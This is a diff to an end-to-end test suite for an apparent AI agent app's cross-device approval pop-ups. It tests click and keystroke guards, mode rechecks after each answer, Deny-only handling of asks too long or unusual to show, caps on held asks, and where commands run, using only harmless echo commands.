@@ -18,8 +18,12 @@ const OVERLAY = { approval: '#approval-overlay', plan: '#plan-approval-overlay',
 const YES = { approval: '#approval-approve', plan: '#plan-approval-approve', path: '#pe-once' };
 const NO = { approval: '#approval-deny', plan: '#plan-approval-deny', path: '#pe-deny' };
 
-const started = (device) =>
-  waitFor(`${device.name} to finish starting`, () => device.page.evaluate(() => state.order.length > 0 && Boolean(state.catalog)));
+// With the guard off, so a test can answer as soon as a pop-up is up. The tests about the guard put
+// back the value that ships.
+const started = async (device) => {
+  await waitFor(`${device.name} to finish starting`, () => device.page.evaluate(() => state.order.length > 0 && Boolean(state.catalog)));
+  await device.page.evaluate(() => { remoteAsks.guardMs = 0; });
+};
 const visible = (device, selector) => device.page.evaluate((sel) => {
   const el = document.querySelector(sel);
   return Boolean(el) && !el.hidden && el.getClientRects().length > 0;
@@ -220,7 +224,7 @@ test('pop-ups on every device', async (t) => {
     assert.equal(lineCount(file), 1);
     assert.equal((await framesOf(laptop, 'ask-closed')).length, closedBefore + 1);
     assert.ok((await toasts(laptop)).some((text) => /another device/.test(text)), 'a pop-up someone was reading doesn\'t just vanish');
-    assert.deepEqual(auditOf(id, 'run_command').answeredBy, [{ kind: 'approval', name: 'home' }]);
+    assert.deepEqual(auditOf(id, 'run_command').answeredBy, [{ kind: 'approval', home: true }]);
   });
 
   await t.test('two answers racing resolve to whichever reaches home first, and the other is ignored', async (s) => {
@@ -257,7 +261,7 @@ test('pop-ups on every device', async (t) => {
       const { result, runs, by } = await raceInOneTick('race-b.txt', 'home-no-first');
       assert.match(result.error, /denied/);
       assert.equal(runs, 0);
-      assert.equal(by[0].name, 'home');
+      assert.deepEqual(by, [{ kind: 'approval', home: true }]);
     });
   });
 
@@ -597,6 +601,21 @@ test('pop-ups on every device', async (t) => {
       await closes(home, 'plan');
       assert.match((await finish()).error, /rejected/);
       assert.deepEqual(await fieldsOf(id), { planMode: true, approvalMode: false, noApproval: false, approvedPlan: null });
+
+      // That laptop's next plan of its own has the words it always had, with nothing left of the last.
+      await laptop.page.evaluate((model) => {
+        const c = addChat(model, 'agent', { planMode: true });
+        window.__ownPlan = c.id;
+        window.__ownPlanAnswer = null;
+        requestPlanApproval('# Its own\n\nA **plan**.', c).then((value) => { window.__ownPlanAnswer = { value }; });
+      }, MODEL);
+      await appears(laptop, 'plan');
+      assert.equal(await textOf(laptop, '#plan-approval-desc'), 'The agent is proposing this plan. On Approve the chat flips to Approval Mode and execution begins — every write still pops a per-call approval. On Reject the agent stays in Plan Mode and refines.');
+      assert.equal(await laptop.page.evaluate(() => document.querySelectorAll('#plan-approval-body strong').length), 1, 'and it\'s markdown again');
+      assert.equal(await laptop.page.evaluate(() => document.querySelectorAll('#plan-approval-body .approval-section').length), 0);
+      await click(laptop, NO.plan);
+      await waitFor('it to answer itself', () => laptop.page.evaluate(() => window.__ownPlanAnswer?.value === false), 5000);
+      await laptop.page.evaluate(() => { deleteChat(window.__ownPlan); });
     });
 
     await s.test('answered at home, it closes on the laptop', async () => {
@@ -608,7 +627,7 @@ test('pop-ups on every device', async (t) => {
       await click(home, YES.plan);
       await closes(laptop, 'plan');
       assert.equal((await finish()).ok, true);
-      assert.deepEqual(auditOf(id, 'exit_plan_mode').answeredBy, [{ kind: 'plan', name: 'home' }]);
+      assert.deepEqual(auditOf(id, 'exit_plan_mode').answeredBy, [{ kind: 'plan', home: true }]);
     });
   });
 
@@ -758,15 +777,16 @@ test('pop-ups on every device', async (t) => {
       await appears(home, 'approval');
       await appears(laptop, 'approval');
       const frame = (await framesOf(laptop, 'ask')).at(-1);
-      assert.equal(frame.tooLarge, true);
+      assert.equal(frame.notShown, true);
       assert.deepEqual(frame.args, {});
       assert.equal(frame.device, LAPTOP);
       assert.ok(!JSON.stringify(frame).includes('THE-SECRET-END'));
       assert.equal(await visible(laptop, YES.approval), false, 'nothing to approve with');
       assert.equal(await visible(laptop, NO.approval), true);
-      assert.match(await textOf(laptop, '#approval-body'), /too long to show here/i);
+      assert.match(await textOf(laptop, '#approval-body'), /too long or too unusual to show here/i);
       assert.match(await textOf(laptop, '#approval-body'), /home/i);
       assert.equal((await approvalText(laptop)).machine, LAPTOP);
+      assert.equal(await laptop.page.evaluate(() => Boolean(document.querySelector('#approval-device').compareDocumentPosition(document.querySelector('#approval-body .ask-not-shown')) & Node.DOCUMENT_POSITION_FOLLOWING)), true, 'Machine first');
       assert.ok((await approvalText(home)).codes.at(-1).endsWith('THE-SECRET-END'), 'at home, every word');
       assert.equal(await visible(home, YES.approval), true);
 
@@ -785,7 +805,7 @@ test('pop-ups on every device', async (t) => {
       const finishNext = await modelCalls(next, 'run_command', { command: 'echo x >> after-too-long.txt', device: LAPTOP });
       await appears(laptop, 'approval');
       assert.equal(await visible(laptop, YES.approval), true);
-      assert.doesNotMatch(await textOf(laptop, '#approval-body'), /too long/i);
+      assert.doesNotMatch(await textOf(laptop, '#approval-body'), /to show here/i);
       await click(laptop, NO.approval);
       await closes(home, 'approval');
       await finishNext();
@@ -808,7 +828,7 @@ test('pop-ups on every device', async (t) => {
       const finish = await modelCalls(id, 'exit_plan_mode', { plan: 'z'.repeat(70 * KIB) });
       await appears(laptop, 'plan');
       assert.equal(await visible(laptop, YES.plan), false);
-      assert.match(await textOf(laptop, '#plan-approval-body'), /too long to show here/i);
+      assert.match(await textOf(laptop, '#plan-approval-body'), /too long or too unusual to show here/i);
       const { id: askId } = (await framesOf(laptop, 'ask')).at(-1);
       await answer(laptop, homeId, askId, true);
       await sleep(300);
@@ -831,7 +851,7 @@ test('pop-ups on every device', async (t) => {
       assert.equal(fs.existsSync(path.join(laptopDir, 'moved.txt')), false);
     });
 
-    await s.test('a home command with its own folder, and a non-text command, show what they\'ll do', async () => {
+    await s.test('a home command with its own folder shows that folder', async () => {
       const id = await shared();
       const finish = await modelCalls(id, 'run_command', { command: 'echo x >> own-folder.txt', cwd: outsideDir });
       await appears(laptop, 'approval');
@@ -1074,7 +1094,7 @@ test('pop-ups on every device', async (t) => {
   });
 
   await t.test('a pop-up mustn\'t catch keys meant for something else', async (s) => {
-    const guard = (device, ms) => device.page.evaluate((value) => { remoteAsks.keyGuardMs = value; }, ms);
+    const guard = (device, ms) => device.page.evaluate((value) => { remoteAsks.guardMs = value; }, ms);
     const focused = (device) => device.page.evaluate(() => document.activeElement?.id ?? null);
     const typeInBox = async (device, words) => {
       await device.page.focus('#composer-input');
@@ -1147,7 +1167,7 @@ test('pop-ups on every device', async (t) => {
         await closes(device, 'approval');
         assert.match((await finish()).error, /denied/);
         assert.equal(lineCount(path.join(homeDir, 'enter-refuses.txt')), 0);
-        await guard(device, 800);
+        await guard(device, 0);
       });
     }
 
@@ -1178,9 +1198,764 @@ test('pop-ups on every device', async (t) => {
       assert.equal(await visible(laptop, OVERLAY.path), true);
       await click(laptop, NO.path);
       await finishPath();
-      await guard(laptop, 800);
+      await guard(laptop, 0);
     });
   });
+
+  // ---- A real person being led into approving ----
+
+  const centre = (device, selector) => device.page.evaluate((sel) => {
+    const r = document.querySelector(sel).getBoundingClientRect();
+    return { x: r.x + r.width / 2, y: r.y + r.height / 2 };
+  }, selector);
+  const shippedGuard = (...devices) => Promise.all(devices.map((device) => device.page.evaluate(() => { remoteAsks.guardMs = ASK_GUARD_MS; })));
+  const noGuard = (...devices) => Promise.all(devices.map((device) => device.page.evaluate(() => { remoteAsks.guardMs = 0; })));
+  const guardMs = await home.page.evaluate(() => ASK_GUARD_MS);
+  const pastTheGuard = () => sleep(guardMs + 100);
+  const mouseAt = async (device, selector) => {
+    const p = await centre(device, selector);
+    await device.page.mouse.move(p.x, p.y);
+    return p;
+  };
+  // Two pop-ups, the first on screen on both ends and the second behind it on both.
+  async function twoAsks(nameA, nameB, argsA = {}, argsB = {}) {
+    const a = await shared();
+    const b = await shared();
+    const finishA = await modelCalls(a, 'run_command', { command: `echo a >> ${nameA}`, ...argsA });
+    await appears(home, 'approval');
+    await appears(laptop, 'approval');
+    const finishB = await modelCalls(b, 'run_command', { command: `echo b >> ${nameB}`, ...argsB });
+    await waitFor('the second to reach the laptop', async () => (await heldCount(laptop)) === 2, 5000);
+    return { a, b, finishA, finishB };
+  }
+  const showing = (device, words) => waitFor(`${device.name} to show ${words}`, async () => (await visible(device, OVERLAY.approval)) && ((await textOf(device, '#approval-body')) ?? '').includes(words), 5000);
+
+  await t.test('a stray or double click can\'t approve what nobody read', async (s) => {
+    await shippedGuard(home, laptop);
+
+    await s.test('a double-click on Approve at the laptop runs the first and only the first', async () => {
+      const { finishA, finishB } = await twoAsks('dbl-a.txt', 'dbl-b.txt');
+      await pastTheGuard();
+      const p = await mouseAt(laptop, YES.approval);
+      await laptop.page.mouse.dblclick(p.x, p.y, { delay: 20 });
+      assert.equal((await finishA()).exitCode, 0);
+      await showing(laptop, 'dbl-b.txt');
+      await sleep(300);
+      assert.equal(lineCount(path.join(homeDir, 'dbl-b.txt')), 0, 'the second click did nothing');
+      assert.equal(await visible(laptop, OVERLAY.approval), true);
+      await click(laptop, NO.approval);
+      assert.match((await finishB()).error, /denied/);
+      assert.equal(lineCount(path.join(homeDir, 'dbl-a.txt')), 1);
+    });
+
+    for (const [where, deviceOf, otherOf] of [['at home', () => home, () => laptop], ['on the laptop', () => laptop, () => home]]) {
+      await s.test(`${where}: with the pointer resting on Approve, a click on the next one to appear does nothing, until it's been read`, async () => {
+        const device = deviceOf();
+        const name = `rest-${device.name}.txt`;
+        const { finishA, finishB } = await twoAsks(`rest-first-${device.name}.txt`, name);
+        const first = await centre(device, YES.approval);
+        await device.page.mouse.move(first.x, first.y);
+        await sleep(100);
+        await click(otherOf(), NO.approval);
+        await showing(device, name);
+        const p = await centre(device, YES.approval);
+        await device.page.mouse.move(p.x, p.y);
+        await device.page.mouse.down();
+        await device.page.mouse.up();
+        await sleep(200);
+        assert.equal(lineCount(path.join(homeDir, name)), 0);
+        assert.equal(await visible(device, OVERLAY.approval), true, 'it stays up');
+        await finishA();
+        await pastTheGuard();
+        await device.page.mouse.down();
+        await device.page.mouse.up();
+        assert.equal((await finishB()).exitCode, 0, 'and a deliberate click after that works');
+        assert.equal(lineCount(path.join(homeDir, name)), 1);
+      });
+    }
+
+    for (const [label, ms] of [['with the guard long past', null], ['with no guard at all', 0]]) {
+      await s.test(`a press on one that's released on the next does nothing, ${label}`, async () => {
+        if (ms === 0) await noGuard(home);
+        const name = `press-${ms === 0 ? 'no-guard' : 'guard'}.txt`;
+        const { finishA, finishB } = await twoAsks(`press-first-${ms}.txt`, name);
+        await pastTheGuard();
+        await mouseAt(home, YES.approval);
+        await home.page.mouse.down();
+        await click(laptop, NO.approval);
+        await showing(home, name);
+        await pastTheGuard();
+        await home.page.mouse.up();
+        await finishA();
+        await sleep(300);
+        assert.equal(lineCount(path.join(homeDir, name)), 0);
+        assert.equal(await visible(home, OVERLAY.approval), true);
+        await click(home, NO.approval);
+        assert.match((await finishB()).error, /denied/);
+        await shippedGuard(home);
+      });
+    }
+
+    await s.test('two clicks 150 ms apart on two writes in one chat write one file', async () => {
+      const id = await shared();
+      const fileA = path.join(homeDir, 'same-chat-a.txt');
+      const fileB = path.join(homeDir, 'same-chat-b.txt');
+      await go(id);
+      const first = await ollama.next();
+      first.call(['write_file', { path: fileA, content: 'a' }], ['write_file', { path: fileB, content: 'b' }]);
+      first.finish();
+      await appears(home, 'approval');
+      await pastTheGuard();
+      await mouseAt(home, YES.approval);
+      await home.page.mouse.down();
+      await home.page.mouse.up();
+      await showing(home, 'same-chat-b.txt');
+      await sleep(150);
+      await home.page.mouse.down();
+      await home.page.mouse.up();
+      await sleep(300);
+      assert.equal(fs.existsSync(fileA), true);
+      assert.equal(fs.existsSync(fileB), false, 'the second click did nothing');
+      await click(home, NO.approval);
+      const next = await ollama.next();
+      next.say('Done.');
+      next.finish();
+      await stopped(id);
+    });
+
+    await s.test('the next one starts its own guard however the last one ended', async () => {
+      const { a, finishB } = await twoAsks('ended-first.txt', 'ended-next.txt');
+      await home.page.evaluate((chatId) => stopChatAndQueue(state.chats[chatId]), a);
+      await stopped(a);
+      await showing(laptop, 'ended-next.txt');
+      const p = await mouseAt(laptop, YES.approval);
+      await laptop.page.mouse.click(p.x, p.y);
+      await sleep(200);
+      assert.equal(lineCount(path.join(homeDir, 'ended-next.txt')), 0);
+      await click(laptop, NO.approval);
+      await finishB();
+    });
+
+    await s.test('Deny works at once, by mouse, on each kind, and the other choices wait, by mouse and by touch', async () => {
+      const kinds = [
+        ['approval', {}, ['run_command', { command: 'echo x >> at-once.txt' }], ['#approval-approve']],
+        ['plan', { planMode: true, approvalMode: false }, ['exit_plan_mode', { plan: 'At once.' }], ['#plan-approval-approve']],
+        ['path', { approvalMode: false, noApproval: true }, ['read_file', { path: path.join(outsideDir, 'at-once.txt') }], ['#pe-once', '#pe-folder']]
+      ];
+      fs.writeFileSync(path.join(outsideDir, 'at-once.txt'), 'x');
+      await Promise.all([home, laptop].map((device) => device.page.evaluate(() => { remoteAsks.guardMs = 5000; })));
+      for (const [kind, fields, [tool, args], agreeing] of kinds) {
+        for (const device of [home, laptop]) {
+          const id = await shared(fields);
+          // Toasts stacked over a pop-up's footer are left for later, and they'd take the click.
+          await clearToasts(device);
+          const finish = await modelCalls(id, tool, args);
+          await appears(device, kind);
+          for (const button of agreeing) {
+            const p = await centre(device, button);
+            await device.page.mouse.click(p.x, p.y);
+            await device.page.evaluate((sel) => {
+              const el = document.querySelector(sel);
+              const r = el.getBoundingClientRect();
+              const at = { pointerId: 2, pointerType: 'touch', bubbles: true, clientX: r.x + 4, clientY: r.y + 4 };
+              el.dispatchEvent(new PointerEvent('pointerdown', at));
+              el.dispatchEvent(new PointerEvent('pointerup', at));
+              el.dispatchEvent(new MouseEvent('click', { bubbles: true, detail: 1, clientX: r.x + 4, clientY: r.y + 4 }));
+            }, button);
+          }
+          await sleep(60);
+          assert.equal(await visible(device, OVERLAY[kind]), true, `${kind} on ${device.name}: nothing agreed`);
+          const p = await centre(device, NO[kind]);
+          await device.page.mouse.click(p.x, p.y);
+          await closes(device, kind);
+          await finish();
+          if (kind === 'plan') assert.equal(await home.page.evaluate((chatId) => state.chats[chatId].planMode, id), true);
+        }
+      }
+      assert.equal(lineCount(path.join(homeDir, 'at-once.txt')), 0);
+      await shippedGuard(home, laptop);
+    });
+
+    await s.test('at the value that ships: a key press in the guard does nothing, and once it has passed it works', async () => {
+      assert.ok(guardMs >= 500, `${guardMs} ms is too short to stop anything`);
+      const file = path.join(homeDir, 'shipped.txt');
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> shipped.txt' });
+      await appears(laptop, 'approval');
+      await laptop.page.keyboard.press('Tab');
+      await laptop.page.keyboard.press('Enter');
+      await laptop.page.keyboard.press('Space');
+      await sleep(150);
+      assert.equal(await visible(laptop, OVERLAY.approval), true);
+      assert.equal(lineCount(file), 0);
+      await pastTheGuard();
+      await laptop.page.keyboard.press('Enter');
+      assert.equal((await finish()).exitCode, 0);
+      assert.equal(lineCount(file), 1);
+    });
+
+    await s.test('someone typing straight through a pop-up isn\'t answering it, and Escape always refuses', async () => {
+      const id = await shared();
+      await openChat(laptop, await newChat(laptop, { modality: 'chat', remoteControl: false, title: 'Typing through', titleManual: true }));
+      await laptop.page.focus('#composer-input');
+      await laptop.page.keyboard.type('before it ');
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> typing.txt' });
+      await appears(laptop, 'approval');
+      const words = 'and these words keep coming long after it appeared, at a normal speed';
+      for (const ch of words) {
+        await laptop.page.keyboard.type(ch);
+        await sleep(70);
+        assert.equal(await visible(laptop, OVERLAY.approval), true, `closed on "${ch}"`);
+      }
+      assert.ok(words.length * 70 > guardMs, 'long enough to have gone past the guard');
+      await pastTheGuard();
+      await laptop.page.keyboard.press('Space');
+      await closes(laptop, 'approval');
+      assert.match((await finish()).error, /denied/, 'having stopped, a key press is a key press, and it landed on the refusal');
+      assert.equal(await laptop.page.inputValue('#composer-input'), 'before it ');
+
+      const again = await modelCalls(id, 'run_command', { command: 'echo x >> typing.txt' });
+      await appears(laptop, 'approval');
+      await laptop.page.keyboard.type('more words');
+      await laptop.page.keyboard.press('Escape');
+      await closes(laptop, 'approval');
+      assert.match((await again()).error, /denied/);
+      assert.equal(lineCount(path.join(homeDir, 'typing.txt')), 0);
+      await laptop.page.fill('#composer-input', '');
+    });
+
+    await noGuard(home, laptop);
+  });
+
+  await t.test('the modes are checked again after every answer', async (s) => {
+    const action = (id, kind, args) => laptop.remote('send', homeId, { type: 'action', id: `a-${Date.now()}-${Math.floor(Math.random() * 1e6)}`, chatId: id, kind, args });
+    const fieldOf = (id, name) => home.page.evaluate(([chatId, field]) => state.chats[chatId][field], [id, name]);
+
+    await s.test('Read-Only, then Approve at home: the command doesn\'t run', async () => {
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> mode-read.txt' });
+      await appears(home, 'approval');
+      await action(id, 'set-toggle', { name: 'readOnly', value: true });
+      await waitFor('the switch', () => fieldOf(id, 'readOnly'), 5000);
+      await click(home, YES.approval);
+      assert.match((await finish()).error, /Read-Only mode/);
+      assert.equal(lineCount(path.join(homeDir, 'mode-read.txt')), 0);
+    });
+
+    await s.test('Plan Mode, then Approve at home: the command doesn\'t run', async () => {
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> mode-plan.txt' });
+      await appears(home, 'approval');
+      await action(id, 'set-mode', { mode: 'plan' });
+      await waitFor('the switch', () => fieldOf(id, 'planMode'), 5000);
+      await click(home, YES.approval);
+      assert.match((await finish()).error, /Plan Mode is on/);
+      assert.equal(lineCount(path.join(homeDir, 'mode-plan.txt')), 0);
+    });
+
+    await s.test('Read-Only, then Approve on the laptop, for a write on the laptop: nothing is written', async () => {
+      const id = await shared();
+      const file = path.join(laptopDir, 'mode-write.txt');
+      const calls = await newestCount(laptop, 'tool-call');
+      const finish = await modelCalls(id, 'write_file', { path: file, content: 'x', device: LAPTOP });
+      await appears(laptop, 'approval');
+      await action(id, 'set-toggle', { name: 'readOnly', value: true });
+      await waitFor('the switch', () => fieldOf(id, 'readOnly'), 5000);
+      await click(laptop, YES.approval);
+      assert.match((await finish()).error, /Read-Only mode/);
+      assert.equal(fs.existsSync(file), false);
+      assert.equal(await newestCount(laptop, 'tool-call'), calls, 'nothing went');
+    });
+
+    await s.test('No-Fetch, then Approve: nothing is fetched', async () => {
+      const id = await shared({ webEnabled: true });
+      const finish = await modelCalls(id, 'web_fetch', { url: 'http://127.0.0.1:9/x' });
+      await appears(home, 'approval');
+      await action(id, 'set-toggle', { name: 'noFetch', value: true });
+      await waitFor('the switch', () => fieldOf(id, 'noFetch'), 5000);
+      await click(home, YES.approval);
+      assert.match((await finish()).error, /No-Fetch mode/);
+    });
+
+    await s.test('Read-Only while an access pop-up is open: "Just this once" doesn\'t write, on either machine', async () => {
+      for (const [device, dir] of [[LAPTOP, laptopDir], [undefined, homeDir]]) {
+        const id = await shared({ approvalMode: false, noApproval: true });
+        const file = path.join(outsideDir, `mode-access-${device || 'home'}.txt`);
+        const finish = await modelCalls(id, 'write_file', { path: file, content: 'x', ...(device ? { device } : {}) });
+        await appears(laptop, 'path');
+        await action(id, 'set-toggle', { name: 'readOnly', value: true });
+        await waitFor('the switch', () => fieldOf(id, 'readOnly'), 5000);
+        await click(laptop, '#pe-once');
+        await closes(home, 'path');
+        assert.match((await finish()).error, /Read-Only mode/, dir);
+        assert.equal(fs.existsSync(file), false);
+      }
+    });
+
+    await s.test('a plan approved after a flip to No-Approval still lands in Approval Mode, the stricter', async () => {
+      const id = await shared({ planMode: true, approvalMode: false });
+      const finish = await modelCalls(id, 'exit_plan_mode', { plan: 'A plan.' });
+      await appears(laptop, 'plan');
+      await action(id, 'set-mode', { mode: 'noApproval' });
+      await waitFor('the switch', () => fieldOf(id, 'noApproval'), 5000);
+      await click(laptop, YES.plan);
+      assert.equal((await finish()).ok, true);
+      assert.equal(await fieldOf(id, 'approvalMode'), true);
+      assert.equal(await fieldOf(id, 'noApproval'), false);
+    });
+
+    await s.test('with the mode unchanged, an answer still goes through', async () => {
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> mode-same.txt' });
+      await appears(home, 'approval');
+      await click(home, YES.approval);
+      assert.equal((await finish()).exitCode, 0);
+      assert.equal(lineCount(path.join(homeDir, 'mode-same.txt')), 1);
+    });
+  });
+
+  await t.test('an ask a laptop can\'t show or hold never hangs a run with nothing said', async (s) => {
+    const fakeTool = (name) => ({ type: 'function', function: { name, description: 'x', parameters: { type: 'object', properties: { a: {} } } } });
+    const timerOn = () => home.page.evaluate(() => [...remoteAsks.open.values()].some((ask) => ask.timer !== null));
+    let deep = { end: 1 };
+    for (let i = 0; i < 40; i += 1) deep = { deep };
+    const WORDS = `A question from ${homeName} can't be shown here. Answer it at ${homeName}, or press Stop.`;
+    const fillTo20 = async (hostChat) => {
+      for (let i = 0; i < 20; i += 1) {
+        await home.remote('send', laptopId, { type: 'ask', id: `full-${i}`, kind: 'approval', chatId: hostChat, tool: 'run_command', args: { command: `echo ${i}`, cwd: '' }, device: 'x' });
+      }
+      await waitFor('20 held', async () => (await heldCount(laptop)) === 20, 5000);
+    };
+    const empty20 = async () => {
+      for (let i = 0; i < 20; i += 1) await home.remote('send', laptopId, { type: 'ask-closed', id: `full-${i}`, value: null });
+      await waitFor('none held', async () => (await heldCount(laptop)) === 0, 8000);
+    };
+
+    for (const [what, tool, args] of [
+      ['a tool name over 128 characters', `mcp__a__${'x'.repeat(200)}`, { a: 1 }],
+      ['arguments deeper than 32', 'mcp__a__b', deep],
+      ['a key named constructor', 'mcp__a__b', JSON.parse('{"constructor":"x","a":1}')]
+    ]) {
+      await s.test(`${what}: only Deny on the laptop, and with nobody at home the timer ends it`, async () => {
+        await home.page.evaluate((t) => { state.mcpTools = [t]; remoteTools.askWaitMs = 1200; }, fakeTool(tool));
+        const id = await shared();
+        const finish = await modelCalls(id, tool, args, startFromLaptop);
+        await appears(laptop, 'approval');
+        assert.equal(await visible(laptop, YES.approval), false);
+        assert.equal(await visible(laptop, NO.approval), true);
+        assert.match(await textOf(laptop, '#approval-body'), /to show here/);
+        assert.equal(await home.page.evaluate(() => [...remoteAsks.open.values()][0].frame.notShown), true);
+        assert.equal(await visible(home, OVERLAY.approval), true);
+        assert.equal(await timerOn(), true, 'nobody can approve this but someone at home');
+        assert.match((await finish()).error, /Nobody answered/);
+        await closes(laptop, 'approval');
+        await home.page.evaluate(() => { state.mcpTools = []; remoteTools.askWaitMs = 600000; });
+      });
+    }
+
+    await s.test('the same with only Deny can still be refused from the laptop', async () => {
+      await home.page.evaluate((t) => { state.mcpTools = [t]; }, fakeTool('mcp__a__b'));
+      const id = await shared();
+      const finish = await modelCalls(id, 'mcp__a__b', deep, startFromLaptop);
+      await appears(laptop, 'approval');
+      await click(laptop, NO.approval);
+      await closes(home, 'approval');
+      assert.match((await finish()).error, /denied/);
+      await home.page.evaluate(() => { state.mcpTools = []; });
+    });
+
+    await s.test('over the cap: home is told, the timer ends it, and the toast says what to do', async () => {
+      await home.page.evaluate(() => { remoteTools.askWaitMs = 1500; });
+      const hostChat = await shared();
+      await fillTo20(hostChat);
+      await clearToasts(laptop);
+      const id = await shared();
+      const told = await newestCount(home, 'ask-unheld');
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> over-cap.txt', device: LAPTOP }, startFromLaptop);
+      await appears(home, 'approval');
+      await waitFor('home to hear', async () => (await newestCount(home, 'ask-unheld')) === told + 1, 5000);
+      assert.deepEqual(Object.keys((await framesOf(home, 'ask-unheld')).at(-1)).sort(), ['id', 'type']);
+      await waitFor('the toast', async () => (await toasts(laptop)).includes(WORDS), 3000);
+      await waitFor('the timer', timerOn, 3000);
+      assert.equal(await heldCount(laptop), 20);
+      assert.match((await finish()).error, /Nobody answered/);
+      assert.equal(lineCount(path.join(laptopDir, 'over-cap.txt')), 0);
+      await empty20();
+      await sleep(200);
+      assert.equal(await heldCount(laptop), 0);
+      await home.page.evaluate(() => { remoteTools.askWaitMs = 600000; });
+    });
+
+    await s.test('ask-unheld does nothing else: the pop-up stays, an answer still counts, and it needs the device asked and an open id', async () => {
+      const id = await shared();
+      const file = path.join(homeDir, 'unheld-told.txt');
+      const finish = await modelCalls(id, 'run_command', { command: 'echo x >> unheld-told.txt' });
+      await appears(laptop, 'approval');
+      const askId = await lastAskId(laptop);
+      assert.equal(await home.page.evaluate((ask) => remoteAsks.open.get(ask).unheld.size, askId), 0);
+
+      for (const frame of [{ type: 'ask-unheld', id: 'not-open' }, { type: 'ask-unheld', id: askId, more: 1 }]) await laptop.remote('send', homeId, frame);
+      await sleep(250);
+      assert.equal(await home.page.evaluate((ask) => remoteAsks.open.get(ask).unheld.size, askId), 0, 'not for those');
+
+      await home.page.evaluate(([ask, device]) => remoteAsks.open.get(ask).asked.delete(device), [askId, laptopId]);
+      await laptop.remote('send', homeId, { type: 'ask-unheld', id: askId });
+      await sleep(250);
+      assert.equal(await home.page.evaluate((ask) => remoteAsks.open.get(ask).unheld.size, askId), 0, 'not from a device not asked');
+      await home.page.evaluate(([ask, device]) => remoteAsks.open.get(ask).asked.add(device), [askId, laptopId]);
+
+      await laptop.remote('send', homeId, { type: 'ask-unheld', id: askId });
+      await waitFor('it to count', () => home.page.evaluate((ask) => remoteAsks.open.get(ask).unheld.size === 1, askId), 3000);
+      assert.equal(await visible(home, OVERLAY.approval), true, 'it can\'t close the pop-up');
+      assert.equal(await timerOn(), false, 'started at home, there\'s no timer to start');
+      await click(laptop, YES.approval);
+      await closes(home, 'approval');
+      assert.equal((await finish()).exitCode, 0);
+      assert.equal(lineCount(file), 1);
+    });
+
+    await s.test('while locked the toast waits, and one for a question since closed isn\'t shown', async () => {
+      await home.page.evaluate(() => { remoteTools.askWaitMs = 600000; });
+      const hostChat = await shared();
+      const [gone, open] = [await shared(), await shared()];
+      await fillTo20(hostChat);
+      await clearToasts(laptop);
+      await laptop.remote('lock');
+      await waitFor('the lock', () => visible(laptop, '#remote-pin-overlay'), 5000);
+
+      const told = await newestCount(home, 'ask-unheld');
+      const finishGone = await modelCalls(gone, 'run_command', { command: 'echo x >> stale.txt' });
+      await waitFor('home to hear', async () => (await newestCount(home, 'ask-unheld')) === told + 1, 5000);
+      assert.deepEqual(await toasts(laptop), [], 'a locked laptop can be over its cap, and says so only to home');
+      await click(home, NO.approval);
+      await finishGone();
+      await waitFor('it to forget', () => laptop.page.evaluate((deviceId) => !remoteAsks.unheld.get(deviceId)?.size, homeId), 5000);
+
+      assert.deepEqual(await laptop.remote('unlock', PIN), { ok: true });
+      await waitFor('the lock to go', async () => !(await visible(laptop, '#remote-pin-overlay')), 5000);
+      await sleep(300);
+      assert.deepEqual((await toasts(laptop)).filter((text) => /can't be shown/.test(text)), [], 'stale, so not shown');
+
+      await click(laptop, NO.approval).catch(() => {});
+      await clearToasts(laptop);
+      await laptop.remote('lock');
+      await waitFor('the lock', () => visible(laptop, '#remote-pin-overlay'), 5000);
+      const toldAgain = await newestCount(home, 'ask-unheld');
+      const finishOpen = await modelCalls(open, 'run_command', { command: 'echo x >> still-open.txt' });
+      await waitFor('home to hear', async () => (await newestCount(home, 'ask-unheld')) === toldAgain + 1, 5000);
+      assert.deepEqual(await toasts(laptop), []);
+      assert.deepEqual(await laptop.remote('unlock', PIN), { ok: true });
+      await waitFor('the lock to go', async () => !(await visible(laptop, '#remote-pin-overlay')), 5000);
+      await waitFor('the toast', async () => (await toasts(laptop)).includes(WORDS), 3000);
+      await click(home, NO.approval);
+      await finishOpen();
+      await empty20();
+      await closes(laptop, 'approval');
+    });
+  });
+
+  await t.test('a working directory shows where it will really run, and runs there', async (s) => {
+    fs.mkdirSync(path.join(homeDir, 'src'), { recursive: true });
+    fs.mkdirSync(path.join(laptopDir, 'src'), { recursive: true });
+    const cases = [
+      ['"." at home', '.', {}, homeDir, homeDir],
+      ['"src" at home', 'src', {}, path.join(homeDir, 'src'), path.join(homeDir, 'src')],
+      ['".." at home', '..', {}, root, root],
+      ['"src/../src" at home', 'src/../src', {}, path.join(homeDir, 'src'), path.join(homeDir, 'src')],
+      ['a blank one at home', '   ', {}, homeDir, homeDir],
+      ['"." on the laptop', '.', { device: LAPTOP }, laptopDir, laptopDir],
+      ['"src" on the laptop', 'src', { device: LAPTOP }, path.join(laptopDir, 'src'), path.join(laptopDir, 'src')],
+      ['".." on the laptop', '..', { device: LAPTOP }, root, root],
+      ['a blank one on the laptop', '', { device: LAPTOP }, laptopDir, laptopDir]
+    ];
+    let n = 0;
+    for (const [what, cwd, where, shownAs, landsIn] of cases) {
+      await s.test(what, async () => {
+        n += 1;
+        const name = `where-${n}.txt`;
+        const id = await shared();
+        const finish = await modelCalls(id, 'run_command', { command: `echo x >> ${name}`, cwd, ...where });
+        await appears(home, 'approval');
+        await appears(laptop, 'approval');
+        assert.equal((await approvalText(home)).codes.at(-1), shownAs);
+        assert.equal((await approvalText(laptop)).codes.at(-1), shownAs);
+        await click(home, YES.approval);
+        assert.equal((await finish()).exitCode, 0);
+        assert.equal(lineCount(path.join(landsIn, name)), 1, `it ran in ${landsIn}`);
+      });
+    }
+
+    await s.test('in the background too', async () => {
+      const name = path.join(homeDir, 'src', 'async-where.txt');
+      const id = await shared();
+      const finish = await modelCalls(id, 'run_command_async', { command: 'echo x >> async-where.txt', cwd: 'src' });
+      await appears(laptop, 'approval');
+      assert.equal(JSON.parse((await approvalText(laptop)).codes.at(-1)).cwd, path.join(homeDir, 'src'));
+      await click(laptop, YES.approval);
+      assert.ok((await finish()).task_id);
+      await waitFor('the task to write', () => lineCount(name) === 1, 8000);
+    });
+
